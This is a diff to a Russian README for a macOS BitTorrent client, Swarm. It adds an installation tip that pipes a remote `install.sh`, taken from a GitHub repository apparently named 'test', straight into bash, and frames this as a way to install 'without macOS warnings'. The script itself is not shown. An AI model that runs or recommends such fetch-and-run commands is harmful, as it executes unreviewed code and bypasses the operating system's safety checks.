@@ -5,6 +5,12 @@ Swift 6 / SwiftUI с интерфейсом **Liquid Glass**. **Весь про�
 сторонних библиотек и бинарников. Используются только системные фреймворки Network.framework, CryptoKit, SwiftUI
 и Swift Charts; uTP, DHT, шифрование, v2 и проброс порта тоже свои.
 
+> **Установка без предупреждений macOS.** Проще всего через [Harbor](../Harbor/) — каталог всех наших приложений.
+> Поставьте его одной командой в Терминале
+> `curl -fsSL https://github.com/parfentsevandrey-blip/test/releases/download/catalog/install.sh | bash`
+> и установите Swarm из каталога: обновления будут приходить сами, данные и настройки сохранятся.
+> Без Harbor: `curl -fsSL https://github.com/parfentsevandrey-blip/test/releases/download/catalog/install.sh | bash -s -- swarm`.
+
 ## Установка
 
 1. Скачайте `Swarm.dmg`: это артефакт **Swarm-dmg** последней сборки в GitHub Actions, workflow «Swarm (macOS)».
